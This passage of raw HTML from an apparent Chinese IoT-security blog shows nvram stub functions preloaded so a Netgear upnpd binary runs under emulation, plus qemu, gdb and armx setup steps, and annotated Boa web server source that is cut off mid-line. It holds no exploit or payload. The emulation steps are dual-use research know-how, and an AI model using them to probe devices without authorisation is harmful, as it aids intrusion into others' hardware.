"</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwURLFilterEnable_Session2(%d) = 0\n"</span>, x);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_tmschDelConf</span><span class="params">(<span class="keyword">char</span> *k)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_tmschDelConf('%s') = 0\n"</span>, k);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_tmschAddConf</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b, <span class="keyword">char</span> *c, <span class="keyword">char</span> *d, <span class="keyword">char</span> *e, <span class="keyword">int</span> f, <span class="keyword">int</span> g, <span class="keyword">int</span> h)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_tmschAddConf('%s', '%s', '%s', '%s', '%s', %d, %d, %d)\n"</span>, a, b, c, d, e, f, g, h);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_tmschDelConf_Session2</span><span class="params">(<span class="keyword">char</span> *k)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_tmschDelConf_Session2('%s') = 0\n"</span>, k);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_tmschAddConf_Session2</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b, <span class="keyword">char</span> *c, <span class="keyword">char</span> *d, <span class="keyword">char</span> *e, <span class="keyword">int</span> f, <span class="keyword">int</span> g, <span class="keyword">int</span> h)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_tmschAddConf_Session2('%s', '%s', '%s', '%s', '%s', %d, %d, %d)\n"</span>, a, b, c, d, e, f, g, h);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwBlkServModAction</span><span class="params">(<span class="keyword">char</span> *k)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwBlkServModAction('%s') = 0\n"</span>, k);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwBlkServModAction_Session2</span><span class="params">(<span class="keyword">char</span> *k)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwBlkServModAction('%s') = 0\n"</span>, k);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwEchoRespSet</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwEchoRespSet(%d) = 1\n"</span>, x);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwURLFilterEnable</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwURLFilterEnable(%d) = 0\n"</span>, x);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwURLFilterEnableTmSch</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwURLFilterEnableTmSch() = 0\n"</span>);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwGetAllServices</span><span class="params">(<span class="keyword">char</span> *k, <span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwGetAllServices('%s', %d) = %d\n"</span>, k, a, counter);</span><br><span class="line">   <span class="keyword">return</span>(counter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">agApi_fwDelTriggerConf2</span><span class="params">(<span class="keyword">char</span> *k)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwDelTriggerConf2('%s')\n"</span>, k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwGetNextTriggerConf</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwGetNextTriggerConf(0x%08x) = 1\n"</span>, a);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// compile</span></span><br><span class="line">armv5l-gcc -Wall -fPIC -shared custom_nvram_r6250.c -o nvram.so</span><br><span class="line"><span class="comment">//usage，用LD_PRELOAD，比如</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/custom_nvram_r6250.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line"><span class="comment">// 参考</span></span><br><span class="line">Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现：https:<span class="comment">//paper.seebug.org/1311/</span></span><br></pre></td></tr></table></figure>
<h2 id="文章链接"><a href="#文章链接" class="headerlink" title="文章链接"></a>文章链接</h2><ul>
<li><p>Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现：<a href="https://paper.seebug.org/1311/" target="_blank" rel="noopener">https://paper.seebug.org/1311/</a> </p>
<ul>
<li>创建/var/run/upnpd.pid</li>
<li>LD_PRELOAD劫持符号，即custom_nvram</li>
<li>配置nvram.ini</li>
</ul>
</li>
<li><p>2</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line">qemu-arm-static -L . -g 1234 var/Sofia（-L 同chroot</span><br><span class="line"></span><br><span class="line">gdb-multiarch var/Sofia</span><br><span class="line"><span class="built_in">set</span> sysroot .</span><br><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ ls</span><br><span class="line">1_var_Sofia  bin  boot  dev  etc  home  lib  linuxrc  mnt  opt  proc  qemu-arm-static  root  sbin  share  slv  sys  usr  var</span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ sudo chroot . ./qemu-arm-static -g 1234 1_var_Sofia </span><br><span class="line">HTTPD: fd: 6, IP: 0x18ea8c0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line">qemu-arm-static -L . -g 1234 var/Sofia（-L 同chroot</span><br><span class="line"></span><br><span class="line">gdb-multiarch var/Sofia</span><br><span class="line"><span class="built_in">set</span> sysroot .</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure>
<ul>
<li>armx</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># devices（注意要用高内核的，其他目录下找到的</span></span><br><span class="line">rv160,qemu-system-arm-4.1.0,vexpress-a9,,,256M,zImage-3.16.57-vexpress,VEXPRESS2,rv160</span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">armx:/armx$ cat rv160/config </span><br><span class="line">id=rv160<span class="comment"># 要与目录名一致</span></span><br><span class="line">nvram=nvram.ini<span class="comment"># 可以不用改，如下</span></span><br><span class="line">rootfs=rootfs/rootfs-101<span class="comment"># 要有权限</span></span><br><span class="line">randomize_va_space=0</span><br><span class="line">ld_preload=preload<span class="comment"># 需导入so库</span></span><br><span class="line">initcommands=<span class="string">"/bin/sh"</span><span class="comment"># 不用非得启动httpd的，可以先进shell后手动启动</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nvram.ini，直接默认即可不影响（但有的需要改</span></span><br><span class="line">armx:/armx$ cat rv160/nvram.ini </span><br><span class="line">key1=value1</span><br><span class="line">key2=value2</span><br><span class="line">key3=value3</span><br><span class="line">key4=value4</span><br><span class="line">key5=value5</span><br><span class="line">key6=value6</span><br><span class="line">key7=value7</span><br><span class="line">key8=value8</span><br><span class="line">key9=value9</span><br><span class="line">key10=value10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动启动mini_httpd</span></span><br><span class="line">mini_httpd -h<span class="comment"># 查看帮助</span></span><br><span class="line">mini_httpd -d /www<span class="comment"># d指定web目录</span></span><br><span class="line">netstat -atp<span class="comment"># 看到www已启动，默认80端口</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/03/18/iot/嵌入式设备web服务器-boa/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/18/iot/嵌入式设备web服务器-boa/" class="post-title-link" itemprop="url">嵌入式设备web服务器-boa</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-18 15:55:13" itemprop="dateCreated datePublished" datetime="2021-03-18T15:55:13+08:00">2021-03-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 17:49:18" itemprop="dateModified" datetime="2022-02-21T17:49:18+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="0-94-14rc21"><a href="#0-94-14rc21" class="headerlink" title="0.94.14rc21"></a>0.94.14rc21</h1><p><a href="http://www.boa.org/boa-0.94.14rc21.tar.gz" target="_blank" rel="noopener">http://www.boa.org/boa-0.94.14rc21.tar.gz</a></p>
<h2 id="boa-c：main"><a href="#boa-c：main" class="headerlink" title="boa.c：main"></a>boa.c：main</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> server_s;               <span class="comment">/* boa socket */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// umask命令指定在建立文件时预设的权限掩码。umask可用来设定[权限掩码]，类似chmod 777</span></span><br><span class="line">    <span class="comment">/* set umask to u+rw, u-x, go-rwx */</span></span><br><span class="line">    <span class="comment">/* according to the man page, umask always succeeds */</span></span><br><span class="line">    umask(<span class="number">077</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// time_t time(time_t *seconds) 返回自纪元起经过的时间，以秒为单位</span></span><br><span class="line">    <span class="comment">/* but first, update timestamp, because log_error_time uses it */</span></span><br><span class="line">    (<span class="keyword">void</span>) time(&amp;current_time);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置时区</span></span><br><span class="line">    <span class="comment">/* set timezone right away */</span></span><br><span class="line">    tzset();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 复制dev/null到标准输入文件描述符</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 先打开，获取fd</span></span><br><span class="line">        <span class="keyword">int</span> devnullfd = <span class="number">-1</span>;</span><br><span class="line">        devnullfd = open(<span class="string">"/dev/null"</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//log_error_mesg_fatal的宏，打印出错时日志信息</span></span><br><span class="line">        <span class="comment">/* make STDIN point to /dev/null */</span></span><br><span class="line">        <span class="keyword">if</span> (devnullfd == <span class="number">-1</span>) &#123;</span><br><span class="line">            DIE(<span class="string">"can't open /dev/null"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将fd复制，之后用STDIN_FILENO即同效果</span></span><br><span class="line">        <span class="comment">// STDIN_FILENO 0   /* standard input file descriptor */</span></span><br><span class="line">        <span class="keyword">if</span> (dup2(devnullfd, STDIN_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">            DIE(<span class="string">"can't dup2 /dev/null to STDIN_FILENO"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关闭原来的fd</span></span><br><span class="line">        (<span class="keyword">void</span>) close(devnullfd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parse_commandline(argc, argv);<span class="comment">// 解析命令行参数</span></span><br><span class="line">    fixup_server_root();<span class="comment">// 确保服务器的根目录是有效的</span></span><br><span class="line">    read_config_files();<span class="comment">// 读取配置文件</span></span><br><span class="line">    create_common_env();<span class="comment">// 设置cgi相关的常用环境变量</span></span><br><span class="line">    open_logs();<span class="comment">// 日志相关</span></span><br><span class="line">    server_s = create_server_socket();<span class="comment">// 创建socket</span></span><br><span class="line">    init_signals();<span class="comment">// 设置信号的处理函数</span></span><br><span class="line">    build_needs_escape();<span class="comment">// 字符相关</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后台运行，fork新进程</span></span><br><span class="line">    <span class="comment">/* background ourself */</span></span><br><span class="line">    <span class="keyword">if</span> (do_fork) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pid = getpid();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 选择父/子进程</span></span><br><span class="line">    <span class="keyword">switch</span> (pid) &#123;</span><br><span class="line">    <span class="comment">// 子进程创建失败</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">        <span class="comment">/* error */</span></span><br><span class="line">        perror(<span class="string">"fork/getpid"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    <span class="comment">// fork后子进程返回0</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="comment">/* child, success */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 本身的父进程</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// 将进程号写入pid file</span></span><br><span class="line">        <span class="comment">/* parent, success */</span></span><br><span class="line">        <span class="keyword">if</span> (pid_file != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            FILE *PID_FILE = fopen(pid_file, <span class="string">"w"</span>);</span><br><span class="line">            <span class="keyword">if</span> (PID_FILE != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(PID_FILE, <span class="string">"%d"</span>, pid);<span class="comment">// pid file，只有一行，记录的是相应进程的pid</span></span><br><span class="line">                fclose(PID_FILE);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">"fopen pid file"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果创建了子进程就不用写了</span></span><br><span class="line">        <span class="keyword">if</span> (do_fork)</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃多余的权限，最小权限原则</span></span><br><span class="line">    drop_privs();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* main loop */</span></span><br><span class="line">    timestamp();<span class="comment">//记录时间、打印启动时信息</span></span><br><span class="line">    status.requests = <span class="number">0</span>;<span class="comment">// 请求数</span></span><br><span class="line">    status.errors = <span class="number">0</span>;<span class="comment">// 错误数</span></span><br><span class="line">    start_time = current_time;<span class="comment">//开始时间</span></span><br><span class="line">    loop(server_s);<span class="comment">// 开启服务器，循环监听</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="config-c：read-config-files"><a href="#config-c：read-config-files" class="headerlink" title="config.c：read_config_files"></a>config.c：read_config_files</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_config_files</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *config;</span><br><span class="line"></span><br><span class="line">    current_uid = getuid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定默认的配置文件</span></span><br><span class="line">    <span class="keyword">if</span> (!config_file_name) &#123;</span><br><span class="line">        config_file_name = DEFAULT_CONFIG_FILE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问权限控制</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> ACCESS_CONTROL</span></span><br><span class="line">        access_init();</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span>                          <span class="comment">/* ACCESS_CONTROL */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取配置文件</span></span><br><span class="line">    config = fopen(config_file_name, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!config) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">"Could not open boa.conf for reading.\n"</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 解析配置</span></span><br><span class="line">    parse(config);</span><br><span class="line">    fclose(config);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置主机名</span></span><br><span class="line">    <span class="keyword">if</span> (!server_name) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">he</span>;</span></span><br><span class="line">        <span class="keyword">char</span> temp_name[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回本地主机的标准主机名</span></span><br><span class="line">        <span class="keyword">if</span> (gethostname(temp_name, <span class="number">100</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">"gethostname:"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 用域名或主机名获取IP地址（hostent结构体</span></span><br><span class="line">        he = gethostbyname(temp_name);</span><br><span class="line">        <span class="keyword">if</span> (he == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            perror(<span class="string">"gethostbyname:"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 用获取到的hostent结构体来设置</span></span><br><span class="line">        server_name = strdup(he-&gt;h_name);</span><br><span class="line">        <span class="keyword">if</span> (server_name == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            perror(<span class="string">"strdup:"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置tmp目录</span></span><br><span class="line">    tempdir = getenv(<span class="string">"TMP"</span>);</span><br><span class="line">    <span class="keyword">if</span> (tempdir == <span class="literal">NULL</span>)</span><br><span class="line">        tempdir = <span class="string">"/tmp"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here</span></span><br><span class="line">    <span class="keyword">if</span> (single_post_limit &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Invalid value for single_post_limit: %d\n"</span>,</span><br><span class="line">                single_post_limit);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vhost_root &amp;&amp; virtualhost) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Both 